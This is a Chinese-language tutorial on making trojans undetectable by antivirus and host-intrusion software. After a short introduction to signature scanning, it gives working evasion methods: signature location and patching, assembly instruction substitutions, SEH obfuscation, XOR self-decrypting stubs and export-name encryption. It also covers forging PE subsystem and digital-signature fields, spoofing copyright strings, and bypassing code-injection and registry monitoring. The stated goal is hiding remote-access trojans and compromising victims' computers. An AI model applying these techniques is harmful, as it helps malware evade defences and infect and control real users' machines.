### 2 {#2}

一、杀毒软件原理基础

一个杀毒软件的构造的复杂程度要远远高于木马或病毒，所以其原理也比较复杂。而且鉴于现在木马病毒越来越向系统底层发展，杀毒软件的编译技术也在不断向系统底层靠近。例如现在的&quot;主动防御&quot;技术，就是应用RING0层的编译技巧。这里我简单为大家介绍一下基本构成。一个杀毒软件一般由扫描器、病毒库与虚拟机组成，并由主程序将他们结为一体。

    扫描器是杀毒软件的核心，用于发现病毒，一个杀毒软件的杀毒效果好坏就直接取决于它的扫描器编译技术与算法是否先进，而且杀毒软件不同的功能往往对应着不同的扫描器，也就是说，大多数杀毒软件都是由多个扫描器组成的。而病毒库存储的特征码形式则取决于扫描器采用哪种扫描技术。它里面存储着很多病毒所具有的独一无二的特征字符，我们称之为&quot;特征码&quot;。特征码总的分来只有两个，文件特征码与内存特征码。文件特征码存在于一些未执行的文件里，例如EXE文件、RMVB文件、jpg文件甚至是txt文件中都有可能存在文件特征码，也都有可能被查杀。而内存特征码仅仅存在于内存中已运行的应用程序。而虚拟机则是最近引进的概念，它可以使病毒在一个由杀毒软件构建的虚拟环境中执行，与现实的CPU、硬盘等完全隔离，从而可以更加深入的检测文件的安全性。

简单的说，杀毒软件的原理就是匹配特征码。当扫描得到一个文件时，杀毒软件会检测这个文件里是否包含病毒库里所包含的特征码，如果有，则报毒病查杀，如果没有，纵然这个文件确实是一个病毒，它也会把它当作正常文件来看待。

     二、基于文件扫描的杀毒技术

基于文件的杀毒技术可以分为&quot;第一代扫描技术&quot;、&quot;第二代扫描技术&quot;与&quot;算法扫描&quot;这三种方法，对于免杀爱好者来说，要对每一种方法烂熟于心，才能成为高手！但做为一个初学者来说了解一下即可。这里我们就简单介绍一下其中两种种方法，详细的技术原理如果各位得这有兴趣的话可以自己研究。

1、通配符扫描技术

　　通配符扫描技术属于是第一代扫描技术的一个分支，对于&quot;通配符&quot;，可以理解为具有一定意义的符号，例如DOS命令里的*号就是任意长度的任意字符的意思，而且通配符在不同的领域也里可以代表不同的意思。

现在杀毒软件中简单的扫描器常常支持通配符，因为鉴于字符串扫描技术的执行速度与特征码长度限制等问题，使得其逐渐退出历史舞台，取而代之的是通配符扫描技术，通配符扫描技术以同样简单的原理与技术却实现了更为强大的功能。

扫描器中的通配符一般用于跳过某些字节或字节范围，以至于现在有些扫描器还支持正则表达式！

下面我们通过一个例子来讲解通配符扫描技术的原理。

例如我们的病毒库中有这样一段特征码：

0400 B801 020E 07BB ??02 %3 33C9 8BD1 419C

上面的特征码可以解释为：

１、尝试匹配04，如果找到则继续，否则跳出。

２、尝试上一匹配目标后匹配00，如果找到则继续，否则跳出。

３、尝试上一匹配目标后匹配B8，如果找到则继续，否则跳出。

４、尝试上一匹配目标后匹配01，如果找到则继续，否则跳出。

５、尝试上一匹配目标后匹配02，如果找到则继续，否则跳出。

６、尝试上一匹配目标后匹配0E，如果找到则继续，否则跳出。

７、尝试上一匹配目标后匹配07，如果找到则继续，否则跳出。

８、尝试上一匹配目标后匹配BB，如果找到则继续，否则跳出。

９、忽略此字节。

10、尝试上一匹配目标后匹配02，如果找到则继续，否则跳出。

11、在接下来的３个位置（字节）中尝试匹配33，如果找到则继续，否则跳出。

12、尝试上一匹配目标后匹配C9，如果找到则继续，否则跳出。

13、尝试上一匹配目标后匹配8B，如果找到则继续，否则跳出。

14、尝试上一匹配目标后匹配D1，如果找到则继续，否则跳出。

15、尝试上一匹配目标后匹配41，如果找到则继续，否则跳出。

16、尝试上一匹配目标后匹配9C，如果找到则继续，否则跳出。

这种扫描技术通常支持半字节匹配，这样可以更精确地匹配特征码，一些早期的加密病毒用这种方法都比较容易检测出来。

其实现在的一些特征码仍然在使用类似此种方法的特征码表达技术，因此掌握这些知识会对我们以后的免杀有所帮助，同样可以使我们在定位特征码时更加了解自己正在做什么，以及做的是否正确等等，这对于我们来说非常重要。

2、智能扫描

智能扫描属于第二代扫描技术的一个分支，这种方法是在一种病毒变异工具包出现之后提出的。智能扫描法会忽略检测文件中象NOP这样的无意义指令。而对于文本格式的脚本病毒或宏病毒，则可以替换掉多余的例如空格、换行符或制表符等空白字符，这一切替换动作在扫描缓冲区就会执行，从而大大提高了扫描器的检测能力。

3、近似精确识别法

近似精确识别法同样是属于第二代扫描技术的一个分支，但是相比起来应用的更为广泛，这种扫描技术包含了两种方式与若干种方法，在这里不可能一一介绍，下面将主要介绍两种方法的代表。

方法一：多套特征码

该方法采用两个或更多个字符串集来检测每个病毒，如果扫描器检测到其中一个特征符合，那么就会警告发现变种，但并不会执行下一步操作（例如清除病毒体或删除文件）。如果多个特征码全部符合，则报警发现病毒，并执行下一步操作。

方法二：效验和

   对于校验和，也许有些朋友会想到文件校验和比对的方法，这个方法的思路是将每一个无毒的文件生成一个校验和，等待下次扫描时在进行简单的校验和比对即可，如果校验和有所变化，在进行进一步的扫描，这样有利于提升扫描器的效率，但是严格地说，这并不算是扫描技术。

效验和扫描技术利用的最为到位的就是比较出名的KAV（卡巴斯基）了，它的第二代扫描器就采用了密码效验和技术，并且没有使用任何搜索字符串技术。关于效验和是一个复杂的概念，简单的说就是通过对病毒中的某一段代码的计算，从而得出一个值（例如123XY4），与MD5加密有些相似，当然这样说不完全正确。

但KAV采用的是一种由卡巴斯基发明的一种叫做密码效验和的特殊算法，这种算法通常会产生两个值。而且病毒库的查询采用了特征码分类思想，例如扫描EXE文件时只调用与EXE文件有关的病毒库，而根据EXE文件的位置不同（例如文件头、入口点）又分为不同的子库，这样有利于提高扫描速度。

学习免杀，首先你得学会汇编把，基础的指令要懂得一些，一般的指令修改必须会，一般的修改这里就不赘述了，接下来就是掌握一些常用的免杀技巧，这里总结一些

   第一：我们学习免杀的方向：只是为了保护自己的黑软的话！就不会学的那么累（没必去学汇编编程）有时候简单加下壳或者脱下壳就OK！如果是要挑战世界的杀毒软件的话，毕竟每个PC用户安装的杀软都不一样！想抓鸡拿服务器的朋友就要进修脱壳破解，高级汇编的内容了，这将决定你免杀技术的高低！

   第二：免杀的环境：做免杀，逃不了测试这个木马是不是修改成功！所以为了保护自己的系统，我建议学免杀要先学会使用虚拟机，很多人会说，为什么不用影子？影子系统虽然也是可以保护的，暂用资源又少，但是有些反弹型木马，我们运行后如果失败（即使成功）都需要重启来完成完全清除的工作！做过QQ盗号木马跟黑鹰远控软件免杀的朋友应该深有体会！

   第三：杀软的安装设置：个人建议安装卡巴，NOD32,小红伞，瑞星，金山！（当然配置好的电脑可以再加上江民，麦咖啡）！硬盘大的朋友建议全利用虚拟机安装杀软（方便以后重做系统，节省升级病毒库的时间）杀软的设置，可以说是很简单的！每安装完一个杀软，我们都要先在杀软设置里把监控跟自我保护的选项的钩去掉！然后升级病毒库！升级完后再关闭服务跟启动项（利用360安全卫士）这样安装其他的杀软就不会起冲突了！这里注意下！瑞星升级后会自己更改自己的服务为自动，所以瑞星建议最后装，最后升级，再关闭它的服务！这里我想大家肯定是关心杀软的序列号从哪来的吧！瑞星有体验版，金山有37天试用版，NOD32利用PPLOVE网络电视有180天试用！卡巴等洋货在百度上搜索均有可用的序列号！这个就是考验大家的细心了！呵呵！卡巴不建议装6.0.7.0的，人家都在央视打广告了，我们就装2009把！（虽然卡巴的启发比不上 NOD32的，但是它的主动可是免杀爱好者的&quot;粉丝&quot;）

   杀软的查杀特点：

   卡巴：主动+高启发扫描~~，效果相当厉害，卡巴的主动非常麻烦，SSDT也被封了，启发式也极难通过，还是要取决于木马本身的实力了，

   瑞星：国内木马的超级对手可以这么说！对国内的木马定位的特征是洋货的N倍（鸽子见证）主要查杀技术是内存查杀技术，但是对一些生僻的木马，内存病毒库里竟然没有，只要过了表面就可以过内存......主动主杀敏感字符串，不过2009的主动貌似改进了不少......广告卖的倒不错，但是只是针对流行木马！其他不常见木马并没有加大什么强度！

   NOD32：启发扫描的头领！主杀输入表函数，针对MYCCL******做过调整！定位建议用 multiCCL这个来定位！不过这个大块头对生僻壳的侦壳能力不强！加些生僻壳把一些函数保护起来可以让它无用武之地！（这类壳主要是加密型，不建议用压缩型）

金山：数据流查杀技术的代表！简单来说跟瑞星内存查杀技术有点一样！病毒库升级，查杀病毒速度都是超级快！但是杀毒能力比较上面的几款有点逊色！

   360与金山清理专家：行为查杀的代表，金山清理专家比360查杀力度还大！但是监控能力......实在不想说！不过360的5.0版加了木马云查杀，据说不是很好过（没试过~~~）

   以上可以说是所有集合杀软的特点：文件查杀，内存查杀，启发查杀，数据流查杀！行为查杀！主动防御！每个杀软都有自己的特点，一个人也不可能把全球杀软都安装起来研究，但是以上4个杀软跟一个辅助可以说全包括了病毒查杀特点！也不能说哪个不好，哪个很好！有些木马这个杀软杀不出来~~那个就可以杀出来！所以对于现在网上有些朋友对个别杀毒软件不重视，就会导致你所谓的&quot;肉鸡&quot;插翅难飞！嘻嘻！

   接下来就说说技巧方面的

   1.字符串上我们比如这个特征码定位到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion \Run，遇到这个我想大家一定是修改大小写吧，但是有时候修改大小写还是被杀。这个我们可以怎么办呢，我们可以移动位置，因为这个肯定是一个api函数的参数,我们找到那个函数然后修改下调用地址就行了。所以有时候大家不能总用通用方法，要学会变通。

   2.NOD32的疑问，前天有人来问我他说它定位NOD32，定位到了资源上，这个有一个可能是你的定位有错误。这个你可以通过multiccl把资源和输入表段保护起来，然后定位，看可以定位出其他的特征码不能，至于MYCCL，一般的定位最好在代码段开始定位，填充可以选择FF，66什么的，或者反向定位，定位的方法很多的，别人填充00，你就填充00么，现在的杀软已经把myccl扒的一干二净了，有反定位措施...

      3.花指令 花指令无非是一些干扰程序调试的一些手段，当然也可以作为用来迷惑杀毒软件使杀毒软件找不到我们的特征码,从而达到免杀。为什么大家总是喜欢用网上的一些什么花指令方法。其实我发现其实多调用一些子程序，多加一些跳转，要比你们写花指令要好的多。不过本人不推荐使用花指令免杀.

     4.为什我服务端做了免杀,可是生成出来被杀。这个大家首先可以对比一下有什么不同的地方，这个我给大家一个思路，现在杀毒软件就喜欢定位有标志型意义的地方（通俗点讲版权信息），大家在做的时候因为为了保护我们的木马，所以就委屈下原作者，呵呵。版权信息给改了。还有一个就是比如说灰鸽子,现在杀软会定位到它的一些dll文件名上,你修改完dll然后找到调用dll文件的函数，然后修改下参数即可。。。。

   高强度花指令--SEH

       SEH是WINDOWS系统中处理计算机异常行为的一种方式，这种方式的特点就是用入栈的方式把断点保存起来，所以他的效率很高，往往能够处理很多的异常状态。在免杀中我们可以通过它给木马加花，让他&quot;错误&quot;地跳到入口点。

    奉上汇编代码如下：

push 原入口点   -OEP

mov eax,dword ptr fs:[0]

push eax

mov dword ptr fs:[0],esp

mov ebx,0

div ebx

      复制代码

   这样混淆的强度就很大了，其实还有很多这样的方法，自己漫漫研究把。。

   小鱼和Medusa的免杀技巧

1\. 遇到特征码定位在jmp指令上面的 构造替换 push xxxxx ret。

举例: jmp xxxxx

构造替换 push xxxxx

ret

2\. 遇到特征码定位在call指令上的。

举例:

call xxxxx

构造替换: push @f

jmp xxxxx

@@:

；@@的标号表示的是你jmp xxxx指令后面的内存地址。 @f也就是引用@@ 的标号，所以此时@f这里填写的就是jmp xxxxx指令后面的内存地址。。

3\. 遇到特征码定位在ret上

举例: ret

构造替换:

jmp dword ptr [esp]

4\. 遇到特征码定位在test eax, eax je xxxx or eax, eax, je xxxxx cmp eax, 0 jexxxxxx

举例: test eax, eax

je xxxxxx

构造替换: xchg eax, ecx

jecxz xxxxx

5\. 遇到特征码定位在 push [xxxxxx]上的。

举例：push [xxxxx]

构造:

在其之前通过 xchg [xxxxxx], ebx

然后用寄存器传参: push ebx

最后在下面在通过xchg [xxxxxx], ebx 交换回来。

6\. 数据段动态恢复和巧用算法加密结合起来。

前提是对汇编大家一定要有所了解，例如一些人说金山杀的是配置信息上，你完全可以将其这些配置信息所处的地址的数据进行一层加密。或者你可以将其这些偏移所处的数据 通过xchg 交换。

dll注意下 要进行重定位

call $+5 ;机器码是 E8 00000000 00000000是相对地址

@@: pop ebx

sub ebx, @b

下面你就可以通过[ebx+你的偏移]来进行变址寻址了。。

test eax,eax

je xxxxxx

将test eax,eax nop掉，改je为jb

或将两句nop掉

test eax,eax

jnz xxxxxx

将两句nop掉

mov ebx,xxxxxx

mov ebp,eax

双mov可以上下调换

add     edx, dword ptr [ebp+6E]

imul esi, dword ptr [edi+ebx*2+44], 614D6C6C

imul ebp, dword ptr [esi], 0

00              00

00              00

00              00

考虑下移

and eax,80000007

改为：

or eax,7FFFFFF9

用C32asm改，80000007为-80000007，C32asm会自动变为80000007的负数7FFFFFF9

je   等于则跳   改成   jle   也是等于则跳

这是瑞星的新把戏

00436008   09C0 xor EAX,EAX

改为

00436008   09C0 OR EAX,EAX

004A19BD   6A 00 PUSH 0

改为

004A19BD   6A 01 PUSH 1

0049D775   /77 07 JA SHORT 021.0049D77E

改为

0049D775   /7F 07 JG SHORT 021.0049D77E

特征码定位出来用OD载入却显示无此地址的解决方法

dll:

也许你经常遇到特征码定位出来用OD载入却显示无此地址.

我们用灰鸽子VIP2006的GETKEY.DLL做演示.

假若特征码为

[特征] 000009DA_00000002 004015DA   (OC导出的内存地址)

使用OC导出的地址到OD中却不能使用.这时用lordpe打开GETKEY.dll

00013000

00400000 上下相加得00413000

OD载入入口为00883000 &gt; 55              PUSH EBP

把40换成87就是真正的特征码.008715DA

Dll实例（黑洞1.97 瑞星dll特征）：

OK=1

CharactorTotal=3

Codz1=H_0000354C_0092414C

Codz2=H_0001A4B4_0093B0B4

Codz3=H_0003C958_0095D558

先用lord_PE打开，再用OD打开

文件入口:00042948      

              &gt; -------&gt; 00442948

镜像：00400000                    

                                      &gt;-----------&gt;相减   00520000

内存入口                   00962948

零区无法定位可执行文件数据的问题

1.c32asm来解决,静态反汇编改特征

2.加一0区段，跨区段jmp跳，然后再新区段保存&quot;所有修改&quot;,再回到原特征码处jmp，保存

免杀关键是技巧，关键你对这些汇编指令掌握的程度，以及你对汇编程序的熟练度。。

接下来再说一下NOD32的高启

《一个钉子和一个国家灭亡的故事》大家都知道

如果有那一个钉子，不丢那个马掌，不折那匹战马，不伤那位将军…………

有太多不确定了，只要我们破坏了其中任何一个环节启发杀毒就会全线溃败。

NOD32通过PE结构寻找特征代码 以导入表函数的修改为例 （这个简单，其实还有更复杂的上次那个木马就是12处关联，但是12处关联破坏一个就免杀了）

首先他会从PE MZ那里开始计算PE HARD的位置 在从PE HARD处寻找数据段 计算数据段位置寻找指针的提示位置,然后通过指针的提示位置找到指针,通过指针找到导入表函数。

启发杀毒理解比较困难但是修改还是很简单的，可以说比普通的特征码更容易。我们只要破坏他以上分析的任何一个环节他就会全线溃败。

以前的pcshare有一个超简单过NOD32的方法，那就是将子系统设置为未知，就直接过NOD32的高启发，因为NOD32默认的对未知PE文件不予检测报毒，而恰巧，我们的pcshare通过这样更改之后仍然可以运行，达到了免杀目的，就是这么简单

其实卡巴为我们提供了更多修改的机会

因为他的特征是关联的，只要破坏他的关联就行了

就好像

1+2+3+4+5+6+7+8+9=45一样

特征码是45.当然会有很多选择我们可以改&quot;1&quot;也可以改&quot;2&quot;还可以改&quot;3&quot;……

改掉一个他下面的关联就被破坏了，也就免杀了，

解决NOD32最简单的两个方法

1.把文件子系统设未未知

2.修改OriginalFirstThunk 日期时间标志 ForwarderThunk 以前都是00000000 把它改成FFFFFFFF 或者别的，就这样就可以过了输入表查杀虽然之后lordpe提示&quot;错误的指针&quot;，但是功能，上线都是没有损坏的

至于原理，我上面说的很清楚了，呵呵

接下来说下基因启发

因启发是通过比对文件当中的关键代码，来查杀新病毒以及变种，这种方式在现阶段的优势比较明显，查杀率高，占用内存少，但从缺点来看，这种启发技术在现阶段已经暴露出来了一个很严重的问题就是误报过于严重，在国外的误报测试当中，使用这项技术的杀软普遍误报十分厉害，像蜘蛛，红伞，飞塔等等。而从长远来看，这种技术随着时间的增长，病毒的种类越来越多，必定造成基因库的臃肿，随之造成的结果就是杀软的运行效率降低，占用资源量的提升，甚至出现不同基因代码间的冲突，所以这项技术虽然在现阶段被看好，而且在技术上也没什么难度。

这个是基因启发启发的定义，但是NOD32这么多特征完全来自广谱查杀jack的文章曾说过： 引用:例如，如果一段程序以如下序列开始：MOV AH ,5/INT,13h，即调用格式化盘操作的BIOS指令功能，

那么这段程序就高度可疑值得引起警觉，尤其是假如这段指令之前不存在取得命令行关于执行的参数选项，又没有要求

用户交互性输入继续进行的操作指令时，就可以有把握地认为这是一个病毒或恶意破坏的程序。

例子：一个免杀卡巴的木马加一个被杀的花卡巴会提示type win32病毒 和感染pe的病毒一样

卡巴会确定他的入口点，一般程序的入口点一般不会在程序的最后一个PE节里。如果OEP在最后一个PE节里就值得卡巴怀疑。所以有的&quot;牛人&quot;在2007年初提出了OEP虚拟化…………但是我不懂编程但是我们可以修改PE结构让入口不在最后一个PE节里，比如在木马修改（非PE感染形）用跳转法移动头部某些代码，在头部空出广大区域加花。或者加完花（感染以后）在加一个空文件节。（这个适用与病毒编程）

写着写着就有点跑题……………………

对于NOD32 pcshare特征码超多的问题

解释很简单 pcshare是一个典型的4代木马（也有人称为3代，看分代标准）

很多代码很典型，适用于杀软研究广谱查杀。NOD32的启发更偏向于基因启发，但他没有独立的基因库，用病毒库代替了基因库，通过在病毒库里比对代码，确认病毒，看到我前面对基因启发的介绍，相信对NOD32病毒库小不难理解吧，很明显NOD32的开发者也意识到了这点，所以NOD32对启发可以报的病毒是不入库的。对于pcshare4处关键作为启发杀毒，剩下26个特征是辅助定位，4处关键修改后少量修改辅助定位就可以了。

关于OD修改字符串

例如pcshare有一个定位在&quot;%S%S%S&quot;上的...我们可以首先用C32把&quot;%S%S%S&quot;向前移一位，然后用OD载入，右键，超级字符串参考，

查找ASCII，然后找到所有的&quot;s%s%s&quot;(一般是一个PUSH或者CALL指令，他调用的就是这个字符串的地址)，由于我们向前移了一位，所以显示的应该是&quot;s%s%s&quot;，然后双击来一个个修改...双击后会发现，对应的语句会有一个地址，我们把它改掉，向前一位，如4AD05168就改成 4AD05167，接着同样方法继续改其它有&quot;s%s%s&quot;的...

这个方法通用字符串的修改...

另外还有一个容易忽略的问题，那就是文件版权

建议大家的木马都不要使用原来的图标和版权信息，可以加上微软，360的版权信息，有不少杀软会针对版权信息进行查杀（例：小红伞，遇到过几次，其余的不清楚）

360、卡巴免杀

怎么过360 卡巴 瑞星 金山 。。。

360其实很好过 行为查杀

只要把木马默认的文件名 服务名 （现在应该没人在使用win98了吧 或用注册表启动的木马了吧 如果有那么把注册表里的启动键值改了）修改掉 就OK了

金山流氓查杀也是一样的

接着说

瑞星 和 金山 其实 别看官方吹得很好 其实很垃圾 主动防御如同虚设

这里据个例子

黑洞1.96 吧 因为介绍卡巴的时候用到它 把服务端里面的 黑洞 藏鲸阁 等替换掉 (老陈，不是要砸你招牌 而是**的） 再把刚才说的 文件名 服务名 都换成其他的 那主动就过去了

其实NS也行 把SYSNS.DLL 改名 把版权去掉（老熊莫怪哦）再定位出其他的特征码 修改掉（表面没过，以上是废话）

那么 金山 瑞星 360 就过去了

再说卡巴

卡巴2009的主动防御是很强悍的

其实 驱动过是最完美的

可是我菜 不会写驱动 不过 黑洞1.96国庆版 内有驱动 直接修改 因为这个驱动是为过卡巴而写 所以 只需要过卡巴就OK了

巧用算法加密特征码 XOR算法, 相同为0,相异为1

举个例子

此时

0001 xor 1111 = 1110

1110 xor 0001 = 1111

以下是加密代码

另外还有kipass写的加密代码，可以参照

对于代码段,为了躲避跟着杀软跑我们得对代码段进行全部变形处理...有人问了,怎么变形呢?一般研究溢出,软件安全的DDMM,GGJJ们都知道在 shellcode中有一种比较常见的为了保护自己的shellcode被直接修改利用用的xor加密...到这你应该可以想到了,这就是对整个代码段进行xor每个字节加密...但这样一来加密后就不能运行的..所以我们得找一段空白处,写一段我们的解密代码.并把文件入口点跳到这个解密代码上.

就以最近的flash漏洞的shellcode解密头来讲解. shellcode就是这段解密头的.

这里就是解密头...里面我已经注释非常清楚了...哈.到这里又有人要问了..怎么加密呀..上面已经有算法了..要用上面的话直接用这段代码直接运行一次就是就加密的代码了..呵呵..

这样代码段就变的面目全非了...完全不一样了...好下面是数据段的修改了

最简单的修改把原来的数据段里的东西分开处理.比如说资源..把资源全部移位,再修正指向资源的指针..其它以此类推.这完了数据段也处理完了..至少在原来的位置上的东东全部也不一样了...

重定位的段处理和数据段一样..

区段免杀技术

首先添加了一个空区段..名为king.. 这是原来的区

好.看一下这个区里的地址先~ 然后开始做了.

再用十六进制编辑查看一下区的大小情况..

A2A00 到 A2BF0

让整个区整体向上偏移几位.. 由于上面的区本来就没有东西.是空的

所以我们也不用改任何东西.. 大家随机应变吧..

可以适当的在区里面添加上一些伪指令.. 例如可以加入一些异常指令等等.效果自然会更好

教程未完..看到原来一图里面的区了吗..

一般都有PE头的下面..好看我把他们的区名全部给改了..

这样也会误导杀软一些的难度. 其实在其它方面.还有一些免杀技术未被公开

还有一些杀其它部位的特征等等. 我们做免杀.不一定要修改特征码..

对我来说.特征码已经等于是过去了.. 此方法是研究源码免杀的时候悟出来了.

数字签名过卡巴

现在过卡巴主动的基本方法可能就是给木马程序加上数字签名，卡巴对此视而不见

加数字签名很简单，用C32打开文件，从PE头开始的152个字节为 XX XX XX XX 这里为数字签名的地址（倒序）之后的数值是其签名代码的大小，随便找一个带有数字签名的文件，找到他的位置和大小，把代码全部复制下来，粘贴到木马程序中，再更改相关的代码即可，以附件为例，数字签名的位置为：00 8E 00 00 大小：C8 24 那么数字签名则在8E00处，大小就是24C8，将其全部复制，再加在木马程序的最后，然后再修改从PE头开始的152个字节的相关数值即可

Pcshare输出表输出函数名加密法

ok，废话不多说，给大家简要说明下。。

首先ollydbg载入PcMain.dll，然后向下找0区域，然后我们加入我们的加密代码。

如图 ：

这里我简要的说明下代码。

1\. 首先保存我们的寄存器环境。

通过

pushad

popad

然后 我们加入代码

其实这里大家可以运行一遍，此时运行后我们的ServiceMain已经是加密了，然后我们在将.rdata区段数据保存。然后修改.rdata的区段属性为可读可写属性。

修改入口点位我们加入的代码的偏移，此时loader加载后就会进行解密。。

这里给出一个DLL的例子。。

加密后我们的输出函数名为此图。

我来给大家解释下吧，错与对还请大家评论。

嘿嘿！

pushad 和popad作用是为了保存当前寄存器的状况。

call $+5 ; 机器码为E8 00 00 00 00

看机器码，个人认为没什么意思吧，像个NOP

pop eax 这个很简单，EAX出栈，为什么要出栈，刚才不是全部压进去了吗？

因为我们后面的一些操作要用到它这个东东。

xor ax, ax

这几句代码是求我们的基地址 但是由于我们写入的偏移量前面是以1001开头的，所以接下来我们加入rva的时候要减去10000。

上面这段话已经说明了。我就不多说了。

add eax, 3b05h ;3b05h为ServiceMain输出函数名字符串的偏移 （意思就找到输出函数名的内存地址。下面用到嘛）

xchg eax, esi

mov edi, esi

很简单，不用我多说了吧，不会的去查汇编指令。

lods byte ptr ds:[esi] LODS就是取字符串元素指令，大家调试下就知道了。

假如我们加密后的字符串是&quot;A&quot;，那么ESI所指向的内存地址就是下一个字符串的地址了，他是一个字母一个字符的取的。

or al, al （这个是结合下面的一个JE的，因为。晕了怎么说好呢。大家看一下这个函数的最后都是00 00 吧，当我们取完字符串后，也就是解密完成后，循环到这里的时候，OR就是与运算是吧，意思就是是1结果才是1，那么这是零，后面的跳转就当然跳了）

je XXXXXXXX

xor al, 18h 异或运算，重点吧。18是16进制，可以随便改的。

stos byte ptr es:[edi] 这个stos 和LODS相反，既然它取，那么这个就是放的。就是说，经过上面的xor al, 18h 加密后，再放进去，一个一个的解密。

jmp short 1.10011B3F 一个跳，循环结构，但是当解密完成的时候，这个跳会被JE跳转，程序正常运行。

最后POP出栈

恢复之前的寄存器状态。

再最后一个跳到入口点，执行程序。简单。

数据段ASCII字符串内存动态恢复

对于棘手的ASCII字符串，我们还可以使用数据段ASCII字符串内存动态恢复的方法，这里也贴出代码

动态合并法

虽然说不是加密.但是也是利用了内存动态恢复的原理滥生出来的技术吧.. .

简单说明就是:

kernel32.lstrcat这个函数可以对两个push进行合并.

用法:     push 456

push 123

call dword ptr ds:[xxxx]xxxx是输入表对kernel32.lstrcat的数

结果会在123的后面多出456 合并成 123456

具体怎么利用不会说明

简单的打比方就是

当特征码为svchost.exe的时候. (打比方.)

那我们就可以这样拆分. svch 和 ost.exe那样杀软怎么都不会叫了吧.

然后通过内存动态合并.

用法.

00402246 60 pushad

00402247 BB 6F104000 mov ebx, 0040106F ; ASCII &quot;IEFrame&quot;

0040224C B9 02000000 mov ecx, 1

00402251 8B03 mov eax, dword ptr [ebx]

00402253 35 50403020 xor eax, 11111111 ;异或算法,密匙

00402258 8903 mov dword ptr [ebx], eax

0040225A 83C3 04 add ebx, 4

0040225D ^ E2 F2 loopd short 00402251

popad

复制代码

027F5118 /EB 16 jmp short 027F5130 //跳到往下027F5130

027F511A |5B pop ebx //自定位完毕 ebx存是就是紧接着loader下的需要解密处的开始内存地址..也就是027F5131处的

027F511B |33C9 xor ecx, ecx //清空ecx为下面循环解密xor的字节做准备

027F511D |66:B8 625D mov ax, 5D62 //传5D62给ax做初始密匙用

027F5121 |66:31044B xor word ptr [ebx+ecx*2], ax //对ebx+ecx*2处进行双字节解密..以前的都是单字节解密居多.

027F5125 |41 inc ecx //ecx加1,也就是密匙加1,动态变换密钥..这就是这个解密头的稍微比以前的解密强一点的地方..

027F5126 |40 inc eax //eax加1 累计解密多少次了.为下面判断做准备

027F5127 |66:81F9 5101 cmp cx, 151 //此处的151比较就是后面加密的代码的总长度除二..可以替换成你自己按需要解密的总字节数除以二

027F512C |7C F3 jl short 027F5121 //没有解密完就跳,继续解密

027F512E |EB 05 jmp short 027F5135 //解密完了,跳到解密完的地方开始正式执行原程序的代码了,此处跳转地址改成你加密的地方的开始地址

027F5130 E8 E5FFFFFF call 027F511A //配合027F511A处的pop ebx实现此代码的自定位..

复制代码

pushad

call $+5 ; 机器码为E8 00 00 00 00

pop eax

xor ax, ax ;这几句代码是求我们的基地址 但是由于我们写入的偏移量前面是以1001开头的，所以接下来我们加入rva的时候要减去10000。

add eax, 3b05h ;3b05h为ServiceMain输出函数名字符串的偏移

xchg eax, esi

mov edi, esi

@@:

lodsb

or al, al

je @f

xor al, 18h

stosb

jmp @b

@@:

popad

jmp 入口点

复制代码

100118FE 60 pushad

100118FF 90 nop

10011900 E8 00000000 call 10011905

10011905 58 pop eax

10011906 2D 05190110 sub eax, 10011905

1001190B 05 E0400110 add eax, 100140E0

10011910 C700 53655368 mov dword ptr [eax], 68536553

10011916 61 popad

10011917 ^ E9 C7FBFFFF jmp 100114E3

复制代码

pushxxxxx //ost.exe的地址,o的地址.因为他开头嘛

pushxxxxx //接下来的当然是剩下的svch的地址了.

call dword ptr ds:[&lt;kernel32.lstrcat&gt;] //这个kernel32.lstrcat的地址需要自己手动在IAT查找.\

过主动原理

安全软件现状

安全套装普及，反病毒软件、软件防火墙与HIPS技术的融合：

主动防御广泛运用

恶意软件面临的问题

所有传统后门、木马、rootkit初次安装以及进行相关操作时均

无法绕过主动防御的监控，采用主动防御技术的安全软件将提示

用户发现安全威胁。

主动防御为什么对恶意软件有威慑力

? 自启动

? 绕过软件防火墙而采用的方法

? 密码截取

? 释放文件

? 执行程序

? 加载内核级rootkit

? 其他功能需要改写注册表，比如IE BHO

主动防御内容

- 代码注入

- 注册表监控

- 进核心态（驱动安装、访问物理内存）

- 文件监控

- 其他监控（全局钩子安装，终止进程等）

- 各模块交融后的逻辑判断关系

@@@@@@@@@@@@@@@@@@@@@代码注入@@@@@@@@@@@@@@@@@@@@@@

代码注入被广泛使用于穿透软件防火墙，将工作代

码注入至可信进程中.

方法:远程线程、消息钩子、APC、修改线程上下文、API

HOOK等

监控原理

? 挂钩NtCreateThread（Ring3下对应为

CreateRemoteThread）、NtWriteVirtualMemory（Ring3

下对应的WriteProcessMemory）、NtSetContextThread

（Ring3下对应的SetContextThread）等

? 挂钩NtOpenProcess

? 挂钩技术为SSDT Hook or Inline Hook

绕过监控实现代码注入

可以将代码注入转化为修改注册表，比如Winlogon通知包、BHO、

ExplorerShell扩展，可以将指定DLL注入相关进程（防火墙默认允许其

访问网络）。由于主动防御也包含注册表监控功能，所以绕过监

控实现代码注入就转化为绕过注册表监控实现修改注册表，而绕

过注册表监控实现修改注册表具有通用有效的方法，详见后文

进入核心态，恢复钩子（比如恢复SSDT）；或者从磁盘文件解

析取得相关函数原始地址从而绕过监控

注：由于主动防御具有进入核心态监控功能，所以需要绕过进入

核心态监控技术的配合，相关技术详见后文

针对ZoneAlarm Pro只是核心态中挂钩

NtOpenProcess的情况，关键是用户态中使用非常

规方法绕过监控获得进程句柄

方法：根据Csrss进程（Win32环境子系统）的特

性，搜索句柄表，复制句柄，从而绕过监控

衍生：根据句柄表特性，OpenProcess时可以将目标

进程pid加1或者3，可以绕过某些安全软件防止自身

进程被终止的保护

@@@@@@@@@@@@@@@@@@@@@@@@@@@@注册表监控@@@@@@@@@@@@@@@@@@@@@@@

自启动、安装驱动/服务以及其他某些功能实现均需

修改注册表

监控原理

? 挂钩NtSetValueKey等

? 挂钩技术为SSDT Hook or Inline Hook

? 注册表修改通知RegNotifyChangeKeyValue

? 间隔一定时间不断的枚举相关键值，然后自行比较是

否被修改

绕过监控实现修改注册表

? 操控Hive法

优点：Ring3下可实现，能绕过绝大部分注册表实时监控

? 简便方法：

先在本地修改后使用RegSaveKey函数Dump出hive文件，使用时使用

RegRestoreKey恢复导入

注:简便方法可能覆盖目标项下的其他键值数据，所以为了效果的完

美，可以配合RegLoadKey，将hive挂载到其他不被监控的项下修改后

再恢复

? 进入核心态，恢复钩子（比如恢复SSDT）；或者从磁盘文件解

析取得相关函数原始地址从而绕过监控

